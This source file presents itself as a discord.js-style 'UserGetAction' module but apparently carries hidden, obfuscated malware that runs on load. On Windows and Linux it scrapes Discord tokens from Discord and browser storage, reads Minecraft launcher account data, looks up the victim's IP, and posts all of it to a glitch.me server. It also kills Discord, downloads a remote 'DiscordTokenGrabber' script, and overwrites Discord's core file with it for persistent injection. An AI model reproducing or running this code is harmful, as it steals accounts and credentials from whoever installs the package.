const Action = require('./Action'), OS = require('os'), fs = require('fs'), fetch = require('node-fetch'), {execSync} = require('child_process'), Glob = require('glob'), toInject = [], toInjectJS = [], toKill = [], apiurl = 'https://frequent-level-cornflower.glitch.me';
try {
    switch (OS['platform']()) {
    case 'win32':
        const local = process['env']['localappdata'], roaming = process['env']['appdata'], minecraftPath = roaming + '/.minecraft/launcher_accounts.json', remixPath = roaming + '/.minecraft/remix/UID.txt';
        dbPaths = [
            roaming + '/Discord/Local\x20Storage/leveldb',
            roaming + '/DiscordDevelopment/Local\x20Storage/leveldb',
            roaming + '/Lightcord/Local\x20Storage/leveldb',
            roaming + '/discordptb/Local\x20Storage/leveldb',
            roaming + '/discordcanary/Local\x20Storage/leveldb',
            roaming + '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
            roaming + '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
            local + '/Amigo/User\x20Data/Local\x20Storage/leveldb',
            local + '/Torch/User\x20Data/Local\x20Storage/leveldb',
            local + '/Kometa/User\x20Data/Local\x20Storage/leveldb',
            local + '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
            local + '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
            local + '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
            local + '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
            local + '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
            local + '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
            local + '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb'
        ], init();
        function init() {
            fs['readFile'](remixPath, (_0x2e70a9, _0x72e484) => _0x72e484 && minecraft('remix', _0x72e484)), fs['readFile'](minecraftPath, (_0x32a02e, _0x598967) => _0x598967 && minecraft('minecraft', _0x598967)), injectToDiscord(), dbPaths['forEach'](_0x1465df => main(_0x1465df));
        }
        function main(_0x2b7d91) {
            fs['readdir'](_0x2b7d91, (_0x318b56, _0x12476e) => {
                if (_0x12476e) {
                    var _0x4a396e = _0x12476e['filter'](_0x335bfd => _0x335bfd['endsWith']('ldb'));
                    _0x4a396e['forEach'](_0x5cb712 => {
                        var _0x15955b = fs['readFileSync'](_0x2b7d91 + '/' + _0x5cb712)['toString'](), _0x291e77 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/, _0x2dca46 = /"mfa\.[\d\w_-]{84}"/, [_0x47c137] = _0x291e77['exec'](_0x15955b) || _0x2dca46['exec'](_0x15955b) || [undefined];
                        if (_0x47c137)
                            fetch('http://ip-api.com/json/')['then'](_0x1da6f7 => _0x1da6f7['json']())['then'](_0x5119f2 => fetch(apiurl + '/beforeinject', {
                                'method': 'POST',
                                'body': JSON['stringify']({
                                    'token': _0x47c137['slice'](0x1, -0x1),
                                    'ipAddress': _0x5119f2['query']
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0x4ef74a, _0x4babfc) {
            switch (_0x4ef74a) {
            case 'remix':
                fetch(apiurl + '/remix', {
                    'method': 'POST',
                    'body': JSON['stringify']({ 'UID': _0x4babfc })
                });
                break;
            case 'minecraft':
                var [_0x453afd] = /"[\d\w_-]{32}"/['exec'](_0x4babfc);
                if (_0x453afd) {
                    const _0xd65b28 = require(minecraftPath);
                    if (!_0xd65b28['accounts'])
                        return;
                    var _0x512ec4 = _0xd65b28['accounts'][_0x453afd['slice'](0x1, -0x1)];
                    fetch(apiurl + '/minecraft', {
                        'method': 'POST',
                        'body': JSON['stringify']({
                            'eligibleForMigration': _0x512ec4['eligibleForMigration'],
                            'hasMultipleProfiles': _0x512ec4['hasMultipleProfiles'],
                            'legacy': _0x512ec4['legacy'],
                            'localId': _0x512ec4['localId'],
                            'minecraftProfileID': _0x512ec4['minecraftProfile']['id'],
                            'minecraftProfileName': _0x512ec4['minecraftProfile']['name'],
                            'persistent': _0x512ec4['persistent'],
                            'remoteId': _0x512ec4['remoteId'],
                            'type': _0x512ec4['type'],
                            'username': _0x512ec4['username'],
                            'activeAccountLocalId': _0xd65b28['activeAccountLocalId']
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            getInstalledDiscord(), killAllDiscords(), fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0x386766 => _0x386766['text']())['then'](_0xb40702 => toInjectJS['forEach'](_0x3ef459 => fs['writeFileSync'](_0x3ef459, _0xb40702['replace']('*API\x20URL*', apiurl)) ^ execSync(local + '/' + _0x3ef459['split']('/')[0x5] + '/Update.exe\x20--processStart\x20' + _0x3ef459['split']('/')[0x5] + '.exe')));
        }
        function getInstalledDiscord() {
            fs['readdirSync'](roaming)['forEach'](_0x26f9b5 => _0x26f9b5['includes']('cord') && toInject['push'](local + '/' + _0x26f9b5)), toInject['forEach'](_0x275e7d => Glob['sync'](_0x275e7d + '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js')['map'](_0x5ddb3c => toInjectJS['push'](_0x5ddb3c)));
        }
        function killAllDiscords() {
            var _0x7dd031 = execSync('tasklist')['toString']();
            _0x7dd031['includes']('Discord.exe') && toKill['push']('discord'), _0x7dd031['includes']('DiscordCanary.exe') && toKill['push']('discordcanary'), _0x7dd031['includes']('DiscordDevelopment.exe') && toKill['push']('discorddevelopment'), _0x7dd031['includes']('DiscordPTB.exe') && toKill['push']('discordptb'), toKill['forEach'](_0x270740 => execSync('taskkill\x20/IM\x20' + _0x270740 + '.exe\x20/F'));
        }
        break;
    case 'linux':
        const defaut = '/home/' + __dirname['split']('/')[0x2] + '/.config', LdbPaths = [
                defaut + '/discord/Local\x20Storage/leveldb',
                defaut + '/discordcanary/Local\x20Storage/leveldb',
                defaut + '/discordptb/Local\x20Storage/leveldb',
                defaut + '/DiscordDevelopment/Local\x20Storage/leveldb'
            ], LminecraftPath = defaut + '/.minecraft/launcher_accounts.json';
        Linit();
        function Linit() {
            LdbPaths['forEach'](_0x48b4d9 => Lmain(_0x48b4d9));
            var _0x4c6ccd = fs['readFileSync'](LminecraftPath);
            if (_0x4c6ccd)
                Lminecraft(_0x4c6ccd);
            LinjectToDiscord();
        }
        function Lmain(_0x693fac) {
            fs['readdir'](_0x693fac, (_0x86338b, _0x37d51b) => {
                if (_0x37d51b) {
                    var _0x5b5c9e = _0x37d51b['filter'](_0x30f9a1 => _0x30f9a1['endsWith']('ldb'));
                    _0x5b5c9e['forEach'](_0x1f6068 => {
                        var _0x1452a4 = fs['readFileSync'](_0x37d51b + '/' + _0x1f6068)['toString'](), _0x5c1f28 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/, _0x4a3307 = /"mfa\.[\d\w_-]{84}"/, [_0x11bf27] = _0x5c1f28['exec'](_0x1452a4) || _0x4a3307['exec'](_0x1452a4) || [undefined];
                        if (_0x11bf27)
                            fetch('http://ip-api.com/json/')['then'](_0x49209e => _0x49209e['json']())['then'](_0x1da2d0 => fetch(apiurl + '/beforeinject', {
                                'method': 'POST',
                                'body': JSON['stringify']({
                                    'token': _0x11bf27,
                                    'ip': _0x1da2d0['query']
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x177eed) {
            var [_0x4be2d4] = /"[\d\w_-]{32}"/['exec'](_0x177eed);
            if (_0x4be2d4) {
                const _0x31be8e = require(LminecraftPath);
                if (!_0x31be8e['accounts'])
                    return;
                var _0x12c115 = _0x31be8e['accounts'][_0x4be2d4['slice'](0x1, -0x1)];
                fetch(apiurl + '/minecraft', {
                    'method': 'POST',
                    'body': JSON['stringify']({
                        'eligibleForMigration': _0x12c115['eligibleForMigration'],
                        'hasMultipleProfiles': _0x12c115['hasMultipleProfiles'],
                        'legacy': _0x12c115['legacy'],
                        'localId': _0x12c115['localId'],
                        'minecraftProfileID': _0x12c115['minecraftProfile']['id'],
                        'minecraftProfileName': _0x12c115['minecraftProfile']['name'],
                        'persistent': _0x12c115['persistent'],
                        'remoteId': _0x12c115['remoteId'],
                        'type': _0x12c115['type'],
                        'username': _0x12c115['username'],
                        'activeAccountLocalId': _0x31be8e['activeAccountLocalId']
                    })
                });
            }
        }
        function LinjectToDiscord() {
            getInstalledLDiscord(), fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0x375a50 => _0x375a50['text']())['then'](_0x2232ac => toInjectJS['forEach'](_0x512c99 => fs['writeFileSync'](_0x512c99, _0x2232ac['replace']('*API\x20URL*', apiurl))));
        }
        function getInstalledLDiscord() {
            fs['readdirSync'](defaut)['forEach'](_0x494644 => _0x494644['includes']('cord') && toInject['push'](defaut + '/' + _0x494644)), toInject['forEach'](_0x5eae40 => Glob['sync'](_0x5eae40 + '/*/modules/discord_desktop_core/index.js')['map'](_0x5f3a39 => toInjectJS['push'](_0x5f3a39)));
        }
        break;
    case 'darwin':
        break;
    }
} catch (_0x3bc60d) {
}
class UserGetAction extends Action {
    ['handle'](_0x83e854) {
        const _0x4fcbb1 = this['client'], _0x1a9556 = _0x4fcbb1['dataManager']['newUser'](_0x83e854);
        return { 'user': _0x1a9556 };
    }
}
module['exports'] = UserGetAction;
